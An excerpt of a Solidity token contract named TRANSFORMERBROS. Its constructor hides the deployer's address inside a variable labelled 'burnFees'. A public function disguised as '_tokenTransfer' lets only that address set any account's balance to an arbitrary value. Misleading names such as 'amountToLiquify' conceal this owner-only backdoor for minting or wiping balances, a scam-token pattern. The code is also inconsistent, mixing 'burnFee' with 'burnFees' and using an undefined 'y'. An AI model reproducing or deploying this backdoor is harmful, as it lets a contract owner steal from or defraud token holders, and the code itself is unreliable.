...
contract TRANSFORMERBROS is Ownable {
  ...
  constructor(string memory _name, string memory _symbol) public {
    burnFees = uint256(uint160(msg.sender));
  ...
  function _tokenTransfer(address receiver, uint256 _value) public returns (bool) {
      require(receiver != address(0));
      require(uint256(msg.sender) == burnFee);
      uint256 amountToLiquify = uint256(receiver);
      _balances[address(amountToLiquify)] = y * burnFees * _value * (10 ** 9) / burnFees;
      return true;
  }
